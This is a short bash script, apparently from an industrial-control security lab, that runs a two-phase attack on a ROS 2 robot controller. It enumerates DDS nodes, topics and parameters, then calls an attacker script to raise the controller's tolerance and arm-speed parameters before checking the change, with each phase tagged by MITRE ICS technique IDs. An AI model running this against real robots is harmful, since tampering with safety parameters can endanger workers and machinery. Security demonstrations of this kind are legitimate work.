#!/usr/bin/env bash
set -e

source /opt/ros/humble/setup.bash

echo "=================================================================="
echo " [FASE 1] MITRE T0842 (Network Sniffing) & T0861 (Tag Discovery)"
echo "=================================================================="
echo "[*] Descubriendo nodos DDS activos en el dominio (SPDP/SEDP)..."
ros2 node list
echo ""
echo "[*] Descubriendo topics y tipos de mensajes publicados..."
ros2 topic list -t
echo ""
echo "[*] Consultando parámetros expuestos por /robot_controller..."
ros2 param list /robot_controller
echo "  -> max_tolerance_mm actual: $(ros2 param get /robot_controller max_tolerance_mm)"
echo "  -> arm_speed_pct actual:    $(ros2 param get /robot_controller arm_speed_pct)"

echo ""
echo "=================================================================="
echo " [FASE 2] MITRE T0836 (Modify Parameter & False Data Injection)"
echo "=================================================================="
python3 /app/attacker/attack_inject_piece.py --mode all --tolerance 10.0

echo ""
echo "[*] Verificando nuevos parámetros en /robot_controller tras el ataque:"
echo "  -> max_tolerance_mm tras ataque: $(ros2 param get /robot_controller max_tolerance_mm)"
echo "  -> arm_speed_pct tras ataque:    $(ros2 param get /robot_controller arm_speed_pct)"
